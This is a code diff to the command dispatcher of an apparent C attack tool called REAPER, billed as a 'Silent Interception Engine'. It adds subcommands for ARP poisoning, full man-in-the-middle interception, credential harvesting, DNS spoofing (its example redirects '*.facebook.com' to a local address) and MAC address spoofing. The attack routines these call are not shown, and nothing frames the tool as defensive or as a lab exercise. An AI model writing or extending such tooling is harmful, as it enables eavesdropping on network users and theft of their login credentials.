@@ -297,7 +297,15 @@ void execute_command(char* cmd) {
         char* args = cmd + 6;
         while (*args == ' ') args++;
         
-        if (strncmp(args, "poison", 6) == 0) {
+        if (strncmp(args, "intercept", 9) == 0) {
+            char target[32] = "", gateway[32] = "";
+            if (sscanf(args + 9, "%31s %31s", target, gateway) == 2) {
+                reaper_intercept(target, gateway, REAPER_MODE_FULL);
+            } else {
+                printf(COLOR_RED "[!] Usage: reaper intercept <target_ip> <gateway_ip>" COLOR_RESET "\n");
+            }
+        }
+        else if (strncmp(args, "poison", 6) == 0) {
             char target[32] = "", gateway[32] = "";
             if (sscanf(args + 6, "%31s %31s", target, gateway) == 2) {
                 reaper_poison(target, gateway);
@@ -305,13 +313,63 @@ void execute_command(char* cmd) {
                 printf(COLOR_RED "[!] Usage: reaper poison <target_ip> <gateway_ip>" COLOR_RESET "\n");
             }
         }
+        else if (strncmp(args, "harvest", 7) == 0) {
+            char target[32] = "", gateway[32] = "";
+            if (sscanf(args + 7, "%31s %31s", target, gateway) == 2) {
+                reaper_intercept(target, gateway, REAPER_MODE_DOS | REAPER_MODE_INTERCEPT | REAPER_MODE_HARVEST);
+            } else {
+                printf(COLOR_RED "[!] Usage: reaper harvest <target_ip> <gateway_ip>" COLOR_RESET "\n");
+            }
+        }
+        else if (strncmp(args, "dns", 3) == 0) {
+            char domain[128] = "", ip[32] = "";
+            if (sscanf(args + 3, "%127s %31s", domain, ip) == 2) {
+                reaper_dns_add(domain, ip);
+            } else {
+                printf(COLOR_RED "[!] Usage: reaper dns <domain> <fake_ip>" COLOR_RESET "\n");
+                printf(COLOR_YELLOW "    Example: reaper dns *.facebook.com 192.168.1.100" COLOR_RESET "\n");
+            }
+        }
+        else if (strncmp(args, "spoof-mac", 9) == 0) {
+            char mac[24] = "";
+            sscanf(args + 9, "%23s", mac);
+            if (strlen(mac) == 0 || strcasecmp(mac, "random") == 0) {
+                if (reaper_spoof_mac(NULL) == 0) {
+                    printf(COLOR_GREEN "[+] MAC spoofed to random address" COLOR_RESET "\n");
+                } else {
+                    printf(COLOR_RED "[!] MAC spoofing failed (requires root)" COLOR_RESET "\n");
+                }
+            } else {
+                if (reaper_spoof_mac(mac) == 0) {
+                    printf(COLOR_GREEN "[+] MAC spoofed to %s" COLOR_RESET "\n", mac);
+                } else {
+                    printf(COLOR_RED "[!] MAC spoofing failed" COLOR_RESET "\n");
+                }
+            }
+        }
+        else if (strncmp(args, "restore-mac", 11) == 0) {
+            if (reaper_restore_mac() == 0) {
+                printf(COLOR_GREEN "[+] MAC restored to original" COLOR_RESET "\n");
+            } else {
+                printf(COLOR_RED "[!] MAC restore failed" COLOR_RESET "\n");
+            }
+        }
+        else if (strncmp(args, "status", 6) == 0) {
+            reaper_status();
+        }
         else if (strncmp(args, "stop", 4) == 0) {
             reaper_stop();
         }
         else {
-            printf(COLOR_YELLOW "[*] REAPER Commands:" COLOR_RESET "\n");
-            printf("    reaper poison <target> <gateway>\n");
-            printf("    reaper stop\n");
+            printf(COLOR_YELLOW "[*] REAPER - Silent Interception Engine:" COLOR_RESET "\n");
+            printf("    reaper poison <target> <gateway>    ARP poison (DoS mode)\n");
+            printf("    reaper intercept <target> <gateway> Full MITM + capture\n");
+            printf("    reaper harvest <target> <gateway>   Credential harvesting\n");
+            printf("    reaper dns <domain> <fake_ip>       Add DNS spoof rule\n");
+            printf("    reaper spoof-mac [MAC|random]       Change interface MAC\n");
+            printf("    reaper restore-mac                  Restore original MAC\n");
+            printf("    reaper status                       Show attack status\n");
+            printf("    reaper stop                         Stop + restore ARP\n");
         }
         return;
     }
